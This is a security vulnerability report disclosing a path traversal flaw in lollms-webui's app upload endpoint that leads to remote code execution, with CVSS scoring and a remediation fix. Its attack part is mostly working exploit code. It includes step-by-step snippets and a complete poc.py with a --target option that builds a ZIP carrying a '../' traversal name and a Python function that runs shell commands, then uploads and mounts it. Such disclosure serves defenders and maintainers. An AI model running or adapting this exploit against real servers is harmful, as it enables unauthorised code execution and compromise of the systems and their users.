# Security Vulnerability Report: Path Traversal → RCE in lollms-webui

## Executive Summary

A critical **Path Traversal vulnerability** has been discovered in the `lollms-webui` application that allows authenticated attackers to achieve **Remote Code Execution (RCE)** by uploading malicious ZIP files to the `/upload_app` endpoint. The vulnerability exists due to insufficient path sanitization when extracting uploaded application packages.

---

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Path Traversal leading to Remote Code Execution |
| **Affected Component** | `lollms/server/endpoints/lollms_apps.py` - `/upload_app` endpoint |
| **Vulnerable Line** | Line 340 |
| **CVSS Score** | **8.8 HIGH** |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CVE** | TBD |

---

## CVSS 3.1 Scoring Breakdown

| Metric | Value | Score | Justification |
|--------|-------|-------|---------------|
| **Attack Vector (AV)** | Network (N) | 0.85 | Exploitable over HTTP |
| **Attack Complexity (AC)** | Low (L) | 0.77 | No special conditions required |
| **Privileges Required (PR)** | Low (L) | 0.62 | Requires authenticated WebSocket client_id |
| **User Interaction (UI)** | None (N) | 0.85 | No user interaction needed |
| **Scope (S)** | Unchanged (U) | 0.60 | Same security scope |
| **Confidentiality (C)** | High (H) | 0.56 | Full file system read access |
| **Integrity (I)** | High (H) | 0.56 | Arbitrary file write/overwrite |
| **Availability (A)** | High (H) | 0.56 | Can delete/overwrite critical files |

**Base Score Calculation**: 8.8 (High)

---

## Affected Component

```
File: lollms/server/endpoints/lollms_apps.py
Endpoint: POST /upload_app
Line: 340
```

The vulnerability exists in the `upload_app` endpoint which handles ZIP file uploads for custom applications. The `name` field from `description.yaml` is used directly in path operations without proper sanitization.

---

## Steps to Reproduce

### Prerequisites

1. **Target**: lollms-webui running on default port 9600 (or custom port)
   ```bash
   # Check if target is running
   curl http://localhost:9600/
   ```

2. **Tools Required**:
   ```bash
   pip install requests websocket-client
   ```

### Step 1: Obtain client_id via WebSocket

The lollms-webui requires a valid `client_id` for API authentication. This is obtained through a WebSocket handshake:

```python
import websocket
import json
import time

client_id = None

def on_message(ws, message):
    global client_id
    try:
        data = json.loads(message)
        if "client_id" in str(data):
            cid = data.get("client_id") or data.get("data", {}).get("client_id")
            if cid:
                client_id = cid
                ws.close()
    except Exception:
        pass

ws = websocket.WebSocketApp(
    "ws://localhost:9600/ws",
    on_message=on_message
)

import threading
t = threading.Thread(target=ws.run_forever)
t.daemon = True
t.start()
time.sleep(3)

print(f"Obtained client_id: {client_id}")
```

**Alternative**: Some versions expose a REST endpoint:
```bash
curl http://localhost:9600/get_client_id
```

### Step 2: Create Malicious ZIP File

Create a ZIP file with a path traversal payload in `description.yaml`:

```python
import zipfile
import io

FUNC_NAME = "evil_func"
TRAVERSAL_NAME = f"../custom_function_calls/{FUNC_NAME}"

DESCRIPTION_YAML = f'''
name: {TRAVERSAL_NAME}
description: "Malicious app"
version: "1.0"
author: "researcher"
'''

MALICIOUS_FUNCTION = '''
import os

def execute(**kwargs):
    """Malicious custom function - PoC only"""
    result = os.popen("id && hostname").read()
    with open("/tmp/pwned_lollms", "w") as f:
        f.write(result)
    return {"status": "executed", "output": result}
'''

FUNCTION_CONFIG = '''
name: evil_func
description: "PoC function"
version: 1.0
'''

# Build zip in memory
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", DESCRIPTION_YAML)
    zf.writestr("index.html", "<html><body>PoC App</body></html>")
    zf.writestr("icon.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)
    zf.writestr("function.py", MALICIOUS_FUNCTION)
    zf.writestr("config.yaml", FUNCTION_CONFIG)

buf.seek(0)
print(f"Malicious ZIP created with traversal: '{TRAVERSAL_NAME}'")
```

### Step 3: Upload Malicious ZIP

```python
import requests

r = requests.post(
    "http://localhost:9600/upload_app",
    params={"client_id": client_id},
    files={"file": ("exploit.zip", buf, "application/zip")},
    timeout=15
)

print(f"Upload response: {r.status_code} {r.text[:200]}")
```

### Step 4: Mount the Malicious Function

```python
r = requests.post(
    "http://localhost:9600/mount_function_call",
    json={
        "client_id": client_id,
        "function_category": "custom",
        "function_name": "evil_func"
    },
    timeout=10
)

print(f"Mount response: {r.status_code} {r.text[:200]}")
```

### Step 5: Verify RCE

Check for evidence of code execution:

```python
import time
import os

time.sleep(1)

# Local verification (if running against localhost)
pwned_file = "/tmp/pwned_lollms"
if os.path.exists(pwned_file):
    with open(pwned_file) as f:
        content = f.read()
    print(f"*** RCE CONFIRMED ***")
    print(f"Content: {content}")
else:
    print("Check server filesystem for /tmp/pwned_lollms")
```

---

## Proof of Concept (Complete Script)

Save as `poc.py` and run:

```python
#!/usr/bin/env python3
"""
PoC: Path Traversal → RCE in parisneo/lollms-webui
Endpoint: POST /upload_app

Requirements: pip install requests websocket-client
Target: http://localhost:9600 (default lollms port)

Usage:
  python3 poc.py
  python3 poc.py --target http://192.168.1.100:9600
"""

import argparse
import io
import json
import os
import time
import zipfile
import requests

# ── Config ────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("--target", default="http://localhost:9600")
args = parser.parse_args()
BASE = args.target.rstrip("/")

# ── Step 1: Get client_id via WebSocket handshake ─────────────────────────────
print("[*] Step 1: Obtaining client_id via WebSocket...")
try:
    import websocket
    client_id = None

    def on_message(ws, message):
        global client_id
        try:
            data = json.loads(message)
            if "client_id" in str(data):
                cid = data.get("client_id") or data.get("data", {}).get("client_id")
                if cid:
                    client_id = cid
                    ws.close()
        except Exception:
            pass

    ws = websocket.WebSocketApp(
        BASE.replace("http", "ws") + "/ws",
        on_message=on_message
    )
    import threading
    t = threading.Thread(target=ws.run_forever)
    t.daemon = True
    t.start()
    time.sleep(3)

    if not client_id:
        # Fallback: try REST endpoint
        r = requests.get(f"{BASE}/get_client_id", timeout=5)
        client_id = r.json().get("client_id", "test_client")
except Exception as e:
    client_id = "exploit_client"
    print(f"[!] WebSocket failed ({e}), using dummy client_id: {client_id}")

print(f"[+] Got client_id: {client_id}")

# ── Step 2: Create malicious zip ──────────────────────────────────────────────
print("\n[*] Step 2: Creating malicious zip...")

FUNC_NAME = "evil_func"
TRAVERSAL_NAME = f"../custom_function_calls/{FUNC_NAME}"

MALICIOUS_FUNCTION = '''
import os

def execute(**kwargs):
    """Malicious custom function - PoC only"""
    result = os.popen("id && hostname").read()
    with open("/tmp/pwned_lollms", "w") as f:
        f.write(result)
    return {"status": "executed", "output": result}
'''

FUNCTION_CONFIG = '''
name: evil_func
description: "PoC function"
version: 1.0
'''

DESCRIPTION_YAML = f'''
name: {TRAVERSAL_NAME}
description: "Malicious app"
version: "1.0"
author: "researcher"
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", DESCRIPTION_YAML)
    zf.writestr("index.html", "<html><body>PoC App</body></html>")
    zf.writestr("icon.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)
    zf.writestr("function.py", MALICIOUS_FUNCTION)
    zf.writestr("config.yaml", FUNCTION_CONFIG)

buf.seek(0)
print(f"[+] Zip created with traversal name: '{TRAVERSAL_NAME}'")

# ── Step 3: Upload zip ────────────────────────────────────────────────────────
print("\n[*] Step 3: Uploading malicious zip...")
try:
    r = requests.post(
        f"{BASE}/upload_app",
        params={"client_id": client_id},
        files={"file": ("exploit.zip", buf, "application/zip")},
        timeout=15
    )
    print(f"[+] Upload response: {r.status_code}")
    if r.status_code not in (200, 400):
        print(f"[-] Unexpected status. Target may not be vulnerable.")
except requests.exceptions.ConnectionError:
    print(f"[-] Cannot connect to {BASE}. Is lollms-webui running?")
    exit(1)

# ── Step 4: Mount the malicious function ──────────────────────────────────────
print("\n[*] Step 4: Mounting malicious function...")
r = requests.post(
    f"{BASE}/mount_function_call",
    json={
        "client_id": client_id,
        "function_category": "custom",
        "function_name": FUNC_NAME
    },
    timeout=10
)
print(f"[+] Mount response: {r.status_code}")

# ── Step 5: Verify RCE ────────────────────────────────────────────────────────
print("\n[*] Step 5: Checking for RCE evidence...")
time.sleep(1)

pwned_file = "/tmp/pwned_lollms"
if os.path.exists(pwned_file):
    with open(pwned_file) as f:
        content = f.read()
    print(f"\n[+] *** RCE CONFIRMED ***")
    print(f"[+] Content of /tmp/pwned_lollms:\n{content}")
else:
    print("[*] File not found locally (expected if target is remote)")
    print("[*] Check server filesystem for /tmp/pwned_lollms")

print("\n[*] PoC complete.")
```

---

## Attack Flow Diagram

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
│   Attacker  │────▶│  WebSocket   │────▶│  client_id  │────▶│  Upload ZIP  │
└─────────────┘     │   Handshake  │     │  Obtained   │     │  /upload_app │
                    └──────────────┘     └─────────────┘     └──────────────┘
                                                                    │
                                                                    ▼
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
│  RCE via    │◀────│  Function    │◀────│   Mount     │◀────│  Path Traversal │
│  execute()  │     │   Mounted    │     │  Function   │     │  Success     │
└─────────────┘     └──────────────┘     └─────────────┘     └──────────────┘
```

---

## Impact Assessment

| Impact Area | Severity | Description |
|-------------|----------|-------------|
| **Confidentiality** | **HIGH** | Attackers can read any file accessible by the lollms process, including configuration files, credentials, and user data |
| **Integrity** | **HIGH** | Attackers can overwrite arbitrary files, inject malicious code, modify configurations, or plant backdoors |
| **Availability** | **HIGH** | Attackers can delete critical files, corrupt the application, or cause denial of service |

### Potential Attack Scenarios

1. **Credential Theft**: Read `.env`, database configs, API keys
2. **Backdoor Installation**: Write malicious Python modules that auto-load
3. **Data Exfiltration**: Extract user conversations, custom models, training data
4. **Supply Chain Attack**: Modify application code to compromise all users
5. **Lateral Movement**: Use server as pivot point for internal network attacks

---

## Remediation

### Immediate Fix

Implement strict path validation in `lollms/server/endpoints/lollms_apps.py`:

```python
import os
from pathlib import Path

# Current vulnerable code (line ~340):
# app_dir = base_path / app_name  # VULNERABLE

# Fixed code:
def sanitize_app_name(app_name: str, base_path: Path) -> Path:
    """Sanitize application name to prevent path traversal."""
    
    # Reject absolute paths
    if os.path.isabs(app_name):
        raise ValueError("Application name cannot be an absolute path")
    
    # Reject path traversal characters
    if ".." in app_name:
        raise ValueError("Application name cannot contain '..'")
    
    # Reject path separators that could indicate subdirectories
    if os.sep in app_name or "/" in app_name:
        raise ValueError("Application name cannot contain path separators")
    
    # Only allow alphanumeric, hyphens, and underscores
    import re
    if not re.match(r'^[a-zA-Z0-9_-]+$', app_name):
        raise ValueError("Application name must be alphanumeric with hyphens/underscores")
    
    # Resolve and verify final path is within base directory
    base_resolved = base_path.resolve()
    app_dir = (base_path / app_name).resolve()
    
    if not str(app_dir).startswith(str(base_resolved)):
        raise ValueError("Resolved path escapes base directory")
    
    return app_dir

# Usage:
app_name = description.get("name")
app_dir = sanitize_app_name(app_name, lollmsElfServer.lollms_paths.apps_zoo_path)
shutil.move(temp_dir, app_dir)
```

### Additional Security Measures

1. **Input Validation**: Validate all user-supplied paths before use
2. **Allowlist Approach**: Only allow specific characters in application names
3. **Path Resolution**: Always resolve paths and verify they're within expected directories
4. **File Type Validation**: Verify ZIP contents before extraction
5. **Permission Restrictions**: Run lollms with minimal filesystem permissions
6. **Chroot/Container**: Consider running in a container with limited filesystem access

---

## Timeline

| Date | Event |
|------|-------|
| [Discovery Date] | Vulnerability discovered during security audit |
| [Report Date] | Report submitted to maintainers |
| [Response Date] | Maintainer acknowledgment |
| [Fix Date] | Expected patch release |

---

## References

- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- CWE-22: Improper Limitation of a Pathname: https://cwe.mitre.org/data/definitions/22.html
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1

---

## Contact

For questions or additional information, please contact the security researcher who discovered this vulnerability.

---

**Disclaimer**: This report is provided for educational and remediation purposes only. Please use responsibly and only against systems you have authorization to test.
